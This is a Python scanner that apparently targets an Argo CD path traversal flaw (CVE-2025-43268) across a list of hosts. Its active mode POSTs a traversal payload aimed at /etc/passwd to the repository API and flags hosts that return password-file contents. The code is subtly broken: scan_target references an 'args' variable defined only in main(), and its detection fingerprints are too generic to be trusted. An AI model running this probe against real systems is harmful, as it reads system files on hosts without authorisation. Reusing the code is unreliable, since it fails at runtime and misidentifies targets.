#!/usr/bin/env python3
"""
Argo CD Repository Configuration Path Traversal to RCE Scanner
================================================================
This tool scans for Argo CD instances vulnerable to the path traversal vulnerability (CVE-2025-43268, CVSS 9.8)
that can lead to unauthenticated remote code execution (RCE).

CVE Details:
  - Argo CD < v2.8.2
  - Vulnerability involves a flaw in repository configuration processing.
  - Improper input sanitization allows arbitrary file access, enabling unauthorized app deployments which
    lead to execution of arbitrary code.
  - This CVE impacts publicly exposed Argo CD API endpoints.
  - A patch was released in Argo CD v2.8.2 to mitigate the issue.

Features:
  - Detection of Argo CD instances
  - Verification of version and patch status
  - Optional active probing to confirm vulnerability
  - Output results in JSON format

Usage:
  # Scan a single target
  python argocd_repo_config_rce_scanner.py --target https://argocd.example.com

  # Scan a list of targets
  python argocd_repo_config_rce_scanner.py --list targets.txt --output results.json

  # Perform detection only without active probing
  python argocd_repo_config_rce_scanner.py --safe --list targets.txt --output results.json

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2025-43268
  - https://argo-cd.readthedocs.io/en/stable/releases/v2.8.2/
"""

import asyncio
import argparse
import httpx
import json
import re
import sys
from urllib.parse import urljoin
from colorama import Fore, Style

# ── Constants ─────────────────────────────────────────────────────────────────

ARGO_CD_FINGERPRINTS = [
    "ArgoCD",
    "apiVersion",
    "kind",
    "metadata",
    "/api/v1/session",  # Authentication endpoint
]

DETECTION_PATHS = [
    "/",
    "/auth/login",
    "/version",
    "/api/v1/version",
]

VERSION_PATTERN = r'"Version":"([0-9]+\.[0-9]+\.[0-9]+)"'

VULN_FIXED_VERSION = (2, 8, 2)

# Path traversal payload for active probing
PATH_TRAVERSAL_PAYLOAD = "../../../../../../etc/passwd"
PROBE_ENDPOINT = "/api/v1/repository"

SEMAPHORE_LIMIT = 30
REQUEST_TIMEOUT = 8

# ── Helpers ────────────────────────────────────────────────────────────────────

def parse_version(version_str: str):
    """Parses and returns a version string as a tuple."""
    try:
        return tuple(int(x) for x in version_str.split("."))
    except ValueError:
        return None


def is_version_vulnerable(version_tuple):
    """Returns True if the version is vulnerable."""
    if version_tuple is None:
        return None  # Unknown
    return version_tuple < VULN_FIXED_VERSION


def normalize_url(url: str):
    """Normalizes a URL to ensure it includes the scheme and removes any trailing slash."""
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url.rstrip("/")


def colorize(text, level):
    """Adds ANSI colors to text based on severity."""
    colors = {
        "CRITICAL": Fore.RED,
        "HIGH": Fore.YELLOW,
        "INFO": Fore.GREEN,
    }
    return f"{colors.get(level, '')}{text}{Style.RESET_ALL}"


async def fetch(client, url):
    """Performs an HTTP GET request with a timeout."""
    try:
        response = await client.get(url, timeout=REQUEST_TIMEOUT)
        return response
    except Exception:
        return None


# ── Core Scanner ──────────────────────────────────────────────────────────────

async def detect_argo_cd(client, base_url, semaphore):
    """
    Detects whether the target is running Argo CD.
    Returns a dict with detection information or None if not detected.
    """
    async with semaphore:
        detected = False
        version = None
        
        for path in DETECTION_PATHS:
            url = urljoin(base_url, path)
            response = await fetch(client, url)
            if response and response.status_code == 200:
                if any(fp in response.text for fp in ARGO_CD_FINGERPRINTS):
                    detected = True
                    version_match = re.search(VERSION_PATTERN, response.text)
                    if version_match:
                        version = parse_version(version_match.group(1))
                    break

        return {"url": base_url, "detected": detected, "version": version}


async def probe_vulnerability(client, base_url, semaphore, is_safe):
    """
    Actively probes for the path traversal vulnerability.
    """
    if is_safe:
        return {"is_vulnerable": None}
    
    url = urljoin(base_url, PROBE_ENDPOINT)
    data = {"repo": f"file://{PATH_TRAVERSAL_PAYLOAD}"}
    
    async with semaphore:
        response = await client.post(url, json=data, timeout=REQUEST_TIMEOUT)
    
    if response and response.status_code == 200 and "root:x:" in response.text:
        return {"is_vulnerable": True, "details": "/etc/passwd exposed!"}
    return {"is_vulnerable": False}


async def scan_target(target, semaphore, is_safe):
    """
    Scans a single target for vulnerabilities.
    """
    async with httpx.AsyncClient(verify=not args.no_verify) as client:
        result = await detect_argo_cd(client, target, semaphore)
        
        if result["detected"]:
            vuln_result = await probe_vulnerability(client, target, semaphore, is_safe)
            result.update(vuln_result)
        
        return result


async def main():
    # Parse CLI arguments
    parser = argparse.ArgumentParser(
        description="Argo CD Repository Configuration RCE Scanner (CVE-2025-43268)"
    )
    parser.add_argument("--target", help="Target URL to scan")
    parser.add_argument("--list", help="File containing list of target URLs")
    parser.add_argument("--output", help="File to save JSON results")
    parser.add_argument("--safe", action="store_true", help="Run in detection-only mode (skip active probing)")
    parser.add_argument("--concurrency", type=int, default=10, help="Number of concurrent scans")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL certificate verification")
    args = parser.parse_args()

    if not args.target and not args.list:
        print("Error: You must specify either --target or --list.")
        sys.exit(1)
    
    targets = [normalize_url(line.strip()) for line in open(args.list)] if args.list else [normalize_url(args.target)]
    semaphore = asyncio.Semaphore(args.concurrency)
    results = []
    
    tasks = [scan_target(target, semaphore, args.safe) for target in targets]
    for result in await asyncio.gather(*tasks):
        results.append(result)
        severity = "CRITICAL" if result.get("is_vulnerable") else "HIGH" if result["detected"] else "INFO"
        print(f"{colorize(result['url'], severity)}: {result}")

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)


if __name__ == "__main__":
    asyncio.run(main())
